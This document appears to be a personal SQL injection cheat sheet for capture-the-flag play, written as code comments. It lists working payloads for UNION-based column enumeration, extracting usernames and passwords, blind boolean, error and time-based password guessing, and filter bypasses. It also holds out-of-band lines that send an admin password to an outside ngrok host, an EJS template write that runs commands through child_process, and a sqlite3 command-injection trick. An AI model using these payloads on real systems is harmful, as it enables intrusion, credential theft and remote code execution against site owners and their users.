// Sql Injection
//! when the results of the query are returned within the application
//* basic injection
// ' payload ; -- or #
// SELECT a, b FROM table1 UNION SELECT c, d FROM table2 # must have same column number and same column types
// SELECT * FROM something UNION SELECT 1,2,3,4,*,6 FROM flag WHERE '1 // something has 6 columns and flag has 1
//* determining the required number of columns
// ' ORDER BY 1-- || ' UNION SELECT NULL--
// ' ORDER BY 2-- || ' UNION SELECT NULL,NULL--
// ' ORDER BY 3-- || ' UNION SELECT NULL,NULL,NULL--
// when this breaks it means that you reached the limit because if you have 3 columns you can order by 2 by never by 4
//? NULL is compatibale with every data type
//* determining the type of exact columns
//' UNION SELECT 'a',NULL,NULL,NULL--u
//* retreaving two columns in just one columns
//' UNION SELECT username || '~' || password FROM users-- # username~password
//* determining database tables
// SELECT * FROM information_schema.tables # TABLE_CATALOG  TABLE_SCHEMA  TABLE_NAME  COLUMN_NAME  DATA_TYPE
//* determining table columns
// SELECT * FROM information_schema.columns
//! Blind sqli
//* when you don't know what you are loking for just a prefix
//  select name from users where name LIKE 'alphactf%' // % wild card
//  select name from user where name similar to "alphactf{randomchars" // works only in postgress
//* whene there is a sign coming from the server
// xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's
// LENGTH()
//* when there is no sign coming from the server
// ' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) = 'm') THEN 1/0 ELSE 'a' END FROM Users)='a
// oracle : '||(SELECT CASE WHEN SUBSTR(password, 1, 1) = 'a' THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'
// ' AND (CASE WHEN (SUBSTRING(@@version,1,1) > 1) THEN 'a' ELSE 1/1 END)='a
//* when the server return the error message and it contains the query
// CAST((SELECT example_column FROM example_table) AS int) # this can return error conveting "data" to int
//* when the server handles errors in a good way we can use time as a sign
// '; IF (1=1) WAITFOR DELAY '0:0:10'--
//* when there is a filter
// you can use extensions>extenstionname>encode>something to bypass that
//! asynchronus sqli
//* fake section
// we try to evaluate the query and send to a server of our own
// ' UNION SELECT NULL,NULL,password FROM users WHERE username='admin' INTO OUTFILE '//<subdomain>.ngrok.io/pw'--
// ' AND (SELECT password FROM users WHERE username='admin') LIKE 'p%' AND (SELECT LOAD_FILE('//<subdomain>.ngrok.io/p'))--
//? read and wright files
// ' union select 1,'<p><%= process.mainModule.require(\"child_process\").execSync(\"/readflag\") %></p>',2,3 into outfile '/app/views/errors/404.ejs'--

//? sqli filteing
// or => --
// or -- => ;
// word => wo'+or||'rd

// select * where username='admin' and password='sldkfjdlj'
// =>                       ad'||'min           a' is not b'


//? sqli cmd injection
// if using the cli you can execute command but the output should be a valid string
// sqlite3 -csv admin.db "SELECT * from `/readflag | base64 -w0`"



